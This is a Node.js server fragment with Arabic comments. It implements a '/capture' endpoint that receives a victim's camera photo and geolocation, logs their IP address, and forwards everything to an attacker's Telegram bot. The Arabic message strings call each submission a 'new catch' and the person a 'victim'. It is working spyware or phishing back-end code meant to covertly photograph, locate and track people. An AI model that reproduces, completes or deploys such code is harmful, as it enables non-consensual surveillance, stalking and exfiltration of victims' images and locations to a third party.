// ... الكود السابق ...
app.post('/capture', async (req, res) => {
    try {
        const { image, location } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        // إرسال الموقع الجغرافي
        let mapUrl = location && location.lat ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "الضحية رفضت الموقع";
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `🎯 صيد جديد!\n🌐 IP: ${ip}\n📍 الموقع: ${mapUrl}`
        });

        // إرسال الصورة مباشرة للبوت إذا وجدت
        if (image && image.includes("base64")) {
            const buffer = Buffer.from(image.split(",")[1], 'base64');
            const formData = new FormData();
            formData.append('photo', buffer, { filename: 'victim.png' });
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', `📸 صورة الضحية من IP: ${ip}`);

            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
                headers: formData.getHeaders()
            });
        }
        res.status(200).send("Sync OK");
    } catch (e) { res.status(500).send(e.message); }
});
